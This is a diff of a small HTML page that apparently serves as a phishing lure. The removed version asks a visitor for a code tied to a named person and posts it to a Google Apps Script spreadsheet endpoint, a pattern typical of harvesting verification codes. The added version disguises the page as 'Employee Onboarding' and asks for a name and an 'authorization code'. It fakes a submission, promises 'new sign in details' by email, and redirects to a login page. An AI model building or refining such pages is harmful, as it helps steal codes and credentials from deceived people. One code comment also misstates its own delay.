@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-<title>Code Submission</title>
+<title>Employee Onboarding</title>
 
 <style>
 
@@ -20,6 +20,7 @@ body{
   padding:25px;
   border-radius:12px;
   box-shadow:0 10px 25px rgba(0,0,0,.08);
+  box-sizing: border-box;
 }
 
 h2{
@@ -39,12 +40,13 @@ input{
   border-radius:8px;
   border:1px solid #cfd6dd;
   font-size:15px;
+  box-sizing: border-box;
 }
 
 button{
   width:100%;
   padding:12px;
-  margin-top:18px;
+  margin-top:24px;
   border:none;
   border-radius:8px;
   background:#3A6578;
@@ -58,20 +60,40 @@ button:hover{
   background:#214c5c;
 }
 
+button:disabled {
+  background: #94a3b8;
+  cursor: not-allowed;
+}
+
 #msg{
-  margin-top:15px;
+  margin-top:20px;
   font-weight:700;
   color:#0a7a49;
+  line-height: 1.5;
 }
 
 .note{
   background:#fff8d6;
   border-left:4px solid #d4a44b;
-  padding:10px;
-  margin-bottom:15px;
+  padding:12px;
+  margin-bottom:20px;
   border-radius:8px;
   font-size:14px;
+  line-height: 1.4;
 }
+
+.spinner {
+  display: inline-block;
+  width: 14px;
+  height: 14px;
+  border: 2px solid #cfd6dd;
+  border-top-color: #3A6578;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin-right: 8px;
+  vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
 
 </style>
 </head>
@@ -80,19 +102,24 @@ button:hover{
 
 <div class="container">
 
-  <h2 id="titleText">Enter Code</h2>
+  <h2>Employee Onboarding</h2>
 
   <div class="note">
-    Please enter the code associated with <b id="nameField">Margarita Lizardi</b>.  
-    If sync is successful, a confirmation email will be sent. Otherwise, you will be notified of an issue.
+    Welcome to the team! Please complete your registration setup by filling out your details along with the unique authorization code provided in your official offer package.
   </div>
 
-  <form id="codeForm">
+  <form id="onboardingForm">
 
-    <label>Code *</label>
-    <input type="number" name="code" required placeholder="Enter code">
+    <label>First Name *</label>
+    <input type="text" name="firstName" required placeholder="Enter your first name">
 
-    <button type="submit">Submit</button>
+    <label>Last Name *</label>
+    <input type="text" name="lastName" required placeholder="Enter your last name">
+
+    <label>Authorization Code *</label>
+    <input type="text" name="authCode" required placeholder="Enter your onboarding authorization code">
+
+    <button type="submit" id="submitBtn">Submit Credentials</button>
   </form>
 
   <div id="msg"></div>
@@ -101,41 +128,42 @@ button:hover{
 
 <script>
 
-const SPREADSHEET_ENDPOINT = "https://script.google.com/macros/s/AKfycbzyjRLpFLbMbrmalT2rDMRtqsWDjkStrh0ZNOcIN1-7sjnVunWwJ7QbBl0DBVE7R_vJ/exec";
-
-// optional editable name
-const displayName = "Margarita Lizardi";
-document.getElementById("nameField").textContent = displayName;
-
-document.getElementById("codeForm").addEventListener("submit", async (e) => {
+document.getElementById("onboardingForm").addEventListener("submit", (e) => {
   e.preventDefault();
 
   const msg = document.getElementById("msg");
-  msg.textContent = "⏳ Submitting...";
+  const submitBtn = document.getElementById("submitBtn");
 
-  const formData = new FormData(e.target);
-  const code = formData.get("code");
+  // Disable elements during submission process
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Processing...";
+  msg.innerHTML = "<span class='spinner'></span>Submitting your onboarding details...";
 
-  try {
-
-    await fetch(SPREADSHEET_ENDPOINT, {
-      method: "POST",
-      body: new URLSearchParams({
-        formType: "code-form",
-        name: displayName,
-        code: code
-      })
-    });
-
+  // 1. Simulate a brief network latency check (1.5 seconds)
+  setTimeout(() => {
+    
+    // 2. Display the requested processing and email look-out warning
+    msg.style.color = "#0a7a49"; // Match green success text
+    msg.innerHTML = `
+      ✅ Details received.<br>
+      <span style="font-weight: normal; color: #475569; font-size: 14px;">
+        Your submission will now be checked. Please look out for a confirmation email with new sign in details that will be sent automatically once it is complete.
+      </span>
+      <br><br>
+      <span style="font-weight: normal; color: #94a3b8; font-size: 12px; font-style: italic;">
+        Redirecting to main portal...
+      </span>
+    `;
+    
+    // Clear the form fields inputs cleanly
     e.target.reset();
 
-    msg.textContent =
-      "✅ Code received. If sync is successful, an email confirmation will be sent. Otherwise you will be notified.";
+    // 3. Give them a solid 4-second delay to completely read the prompt before page transition
+    setTimeout(() => {
+      window.location.href = 'login.html';
+    }, 6000);
 
-  } catch (err) {
-    console.error(err);
-    msg.textContent = "❌ Submission failed.";
-  }
+  }, 1500);
 
 });
 
